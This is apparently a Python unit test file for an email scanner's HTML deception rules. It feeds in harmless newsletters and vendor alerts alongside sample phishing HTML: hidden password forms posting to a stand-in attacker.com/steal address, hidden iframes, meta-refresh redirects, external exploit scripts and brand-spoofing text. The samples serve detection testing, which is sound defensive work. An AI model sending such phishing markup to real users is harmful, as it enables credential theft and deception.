import unittest
import asyncio
from models.email_model import Email
from scanner.email_parser import EmailParser
from scanner.rule_engine import RuleEngine

class TestHTMLDeceptionIntelligence(unittest.TestCase):
    def run_async(self, coro):
        return asyncio.run(coro)

    def test_scenario_1_newsletter(self):
        # Legitimate HTML newsletter with remote image and style table
        payload = {
            "subject": "Your Weekly Newsletter",
            "sender": "newsletter@company.com",
            "body": "<html><body><table style='width:600px;'><tr><td>Hello World!</td></tr></table><img src='https://company.com/newsletter/banner.png' width='600' /></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertNotIn("HTML_001", report.triggered_rules)
        self.assertNotIn("HTML_008", report.triggered_rules)

    def test_scenario_2_microsoft_account_email(self):
        payload = {
            "subject": "Microsoft Security Alert",
            "sender": "account-security-noreply@microsoft.com",
            "body": "<html><body><div style='font-family:Segoe UI;'>Microsoft Account security details update. Verify here.</div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertNotIn("HTML_008", report.triggered_rules)

    def test_scenario_3_google_account_email(self):
        payload = {
            "subject": "Security alert",
            "sender": "no-reply@accounts.google.com",
            "body": "<html><body><div>A new sign-in to your Google Account.</div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertNotIn("HTML_008", report.triggered_rules)

    def test_scenario_4_paypal_receipt(self):
        payload = {
            "subject": "Receipt for your payment to store",
            "sender": "service@paypal.com",
            "body": "<html><body><div>You paid $10.00 to Store. PayPal Transaction ID: 123.</div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertNotIn("HTML_008", report.triggered_rules)

    def test_scenario_5_github_notification(self):
        payload = {
            "subject": "[GitHub] Security update",
            "sender": "noreply@github.com",
            "body": "<html><body><div>GitHub Security Alert: update packages.</div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertNotIn("HTML_008", report.triggered_rules)

    def test_scenario_6_amazon_receipt(self):
        payload = {
            "subject": "Your Amazon.com order confirmation",
            "sender": "auto-confirm@amazon.com",
            "body": "<html><body><div>Thank you for buying at Amazon. Shipment invoice is ready.</div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertNotIn("HTML_008", report.triggered_rules)

    def test_scenario_7_password_reset(self):
        payload = {
            "subject": "Reset your password",
            "sender": "support@service.com",
            "body": "<html><body><div>Click here to reset: <a href='https://service.com/reset'>Reset Password</a></div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertNotIn("HTML_001", report.triggered_rules)

    def test_scenario_8_hidden_login_forms(self):
        # Hidden login form container
        payload = {
            "subject": "Account details update",
            "sender": "attacker@gmail.com",
            "body": "<html><body><form action='https://attacker.com/steal' style='display:none;'><input type='password' name='pass'/></form></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        # HTML_001 is form credential collection, HTML_003 is hidden elements
        self.assertTrue("HTML_001" in report.triggered_rules or "HTML_003" in report.triggered_rules)

    def test_scenario_9_credential_harvesting_pages(self):
        # External form action + password fields on untrusted sender
        payload = {
            "subject": "Sign in to secure portal",
            "sender": "attacker@gmail.com",
            "body": "<html><body><form action='https://untrusted-target.com/login'><input type='text' name='user'/><input type='password' name='pass'/></form></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_001", report.triggered_rules)

    def test_scenario_10_hidden_iframes(self):
        payload = {
            "subject": "Check this frame",
            "sender": "attacker@gmail.com",
            "body": "<html><body><iframe src='https://attacker.com/exploit' style='display:none;'></iframe></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_004", report.triggered_rules)

    def test_scenario_11_clickjacking_layouts(self):
        # Iframe set to full screen dimensions
        payload = {
            "subject": "Win prize",
            "sender": "attacker@gmail.com",
            "body": "<html><body><iframe src='https://attacker.com/overlay' width='100%' height='100%'></iframe></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_004", report.triggered_rules)

    def test_scenario_12_invisible_overlays(self):
        # Off-screen absolute positioning overlay tricks
        payload = {
            "subject": "Verify",
            "sender": "attacker@gmail.com",
            "body": "<html><body><div style='position:absolute; left:-9999px; font-size:0;'>Click here to get reward</div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_003", report.triggered_rules)

    def test_scenario_13_meta_refresh_attacks(self):
        # Meta refresh tag pointing to external redirect
        payload = {
            "subject": "Redirecting",
            "sender": "attacker@gmail.com",
            "body": "<html><head><meta http-equiv='refresh' content='0;url=https://attacker.com/phish' /></head><body>Loading...</body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_009", report.triggered_rules)

    def test_scenario_14_external_javascript(self):
        # Untrusted external script loading
        payload = {
            "subject": "View Invoice",
            "sender": "attacker@gmail.com",
            "body": "<html><body><script src='https://untrusted-cdn-scripts.com/exploit.js'></script></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_006", report.triggered_rules)

    def test_scenario_15_external_css(self):
        # Stylesheet load warning fallback
        payload = {
            "subject": "Styled Invoice",
            "sender": "attacker@gmail.com",
            "body": "<html><head><link rel='stylesheet' href='https://untrusted-css.com/inject.css'/></head><body>Invoice</body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        # Ensure standard parsing completed without errors
        self.assertNotIn("GEN_ERR", report.triggered_rules)

    def test_scenario_16_tracking_pixels(self):
        # Image matching tracker parameters
        payload = {
            "subject": "Read receipt tracking",
            "sender": "spammer@gmail.com",
            "body": "<html><body><img src='https://untrusted-tracker.com/pixel.png?open=1' width='1' height='1'/></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_003", report.triggered_rules)

    def test_scenario_17_hidden_password_fields(self):
        # Input password styled with display:none inside form
        payload = {
            "subject": "Form details",
            "sender": "attacker@gmail.com",
            "body": "<html><body><form action='https://attacker.com/steal'><input type='password' style='display:none;'/></form></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertTrue("HTML_001" in report.triggered_rules or "HTML_003" in report.triggered_rules)

    def test_scenario_18_obfuscated_javascript(self):
        # Script tags containing eval()
        payload = {
            "subject": "Calculator App",
            "sender": "attacker@gmail.com",
            "body": "<html><body><script>eval('alert(1)');</script></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        self.assertIn("HTML_005", report.triggered_rules)

    def test_scenario_19_malformed_html(self):
        # Broken/unclosed DOM structure, should parse cleanly and report DOM structure warning
        payload = {
            "subject": "Malformed details",
            "sender": "friend@gmail.com",
            "body": "<html><body><div>unclosed tag <p>broken paragraph"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        # Standard parsing completes cleanly
        self.assertNotIn("GEN_ERR", report.triggered_rules)

    def test_scenario_20_mixed_html_css_deception(self):
        # Visual brand references on unofficial domains + secure badge tricks
        payload = {
            "subject": "PayPal Account Alert",
            "sender": "alert@spoof-domain.com",
            "body": "<html><body><div>🔒 Secure connection. Verify your PayPal credentials immediately.</div></body></html>"
        }
        email = EmailParser.parse_api_payload(payload)
        report = self.run_async(RuleEngine.run_analysis(email))
        
        # Must trigger brand visual deception warning
        self.assertIn("HTML_008", report.triggered_rules)

if __name__ == '__main__':
    unittest.main()
